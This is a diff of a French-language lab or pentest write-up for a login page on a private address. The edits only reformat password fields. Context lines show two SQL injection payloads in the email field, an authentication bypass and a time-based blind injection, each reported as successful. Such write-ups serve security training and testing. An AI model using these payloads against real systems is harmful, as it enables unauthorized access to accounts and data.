@@ -99,7 +99,7 @@ URL de connexion : `http://192.168.100.10:3000`
 
 Champ et Valeur     
 Email	' OR 1=1--     
-Password	n'importe quoi     
+Password : test    
 
 ✅ Connexion réussie sans mot de passe grâce à une injection SQL simple.   
 
@@ -109,7 +109,7 @@ Password	n'importe quoi
 
 Champ et Valeur   
 Email	' OR IF(1=1, SLEEP(5), 0)--   
-Password	test   
+Password : test   
 
 ✅ Le serveur prend 5 secondes à répondre, confirmant une Blind SQLi (injection sans message d’erreur).
 
